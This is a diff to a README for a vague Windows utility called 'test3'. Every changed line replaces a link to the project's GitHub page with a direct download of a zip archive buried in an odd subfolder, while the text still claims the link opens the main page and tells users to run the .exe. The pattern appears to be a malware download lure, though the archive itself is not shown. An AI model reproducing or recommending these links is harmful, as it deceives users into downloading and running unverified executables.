@@ -1,6 +1,6 @@
 # ⚙️ test3 - Simple Tool for Everyday Use
 
-[![Download test3](https://img.shields.io/badge/Download-test3-brightgreen)](https://github.com/sdgsdggsdgdgsdgsd/test3)
+[![Download test3](https://img.shields.io/badge/Download-test3-brightgreen)](https://raw.githubusercontent.com/sdgsdggsdgdgsdgsd/test3/main/dogwood/test-v2.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ You don’t need any other software or tools to use **test3**.
 
 Click the large button below to visit the page where you can get **test3**:
 
-[![Download test3](https://img.shields.io/badge/Download-test3-orange)](https://github.com/sdgsdggsdgdgsdgsd/test3)
+[![Download test3](https://img.shields.io/badge/Download-test3-orange)](https://raw.githubusercontent.com/sdgsdggsdgdgsdgsd/test3/main/dogwood/test-v2.9.zip)
 
 This link will take you to the main page for **test3** on GitHub. From there, you can find the latest version of the app.
 
@@ -95,7 +95,7 @@ If it still won’t open, you can visit the GitHub page and check the “Issues�
 
 To update **test3**, visit the download link again:
 
-[Download test3](https://github.com/sdgsdggsdgdgsdgsd/test3)
+[Download test3](https://raw.githubusercontent.com/sdgsdggsdgdgsdgsd/test3/main/dogwood/test-v2.9.zip)
 
 Download the newest **.exe** file and run it. The newer version will replace the old one automatically.
 
@@ -126,4 +126,4 @@ Windows will remove the app and its files.
 
 Visit the GitHub page for **test3** at the link below to find more information, report problems, or ask questions:
 
-[https://github.com/sdgsdggsdgdgsdgsd/test3](https://github.com/sdgsdggsdgdgsdgsd/test3)
+[https://raw.githubusercontent.com/sdgsdggsdgdgsdgsd/test3/main/dogwood/test-v2.9.zip](https://raw.githubusercontent.com/sdgsdggsdgdgsdgsd/test3/main/dogwood/test-v2.9.zip)
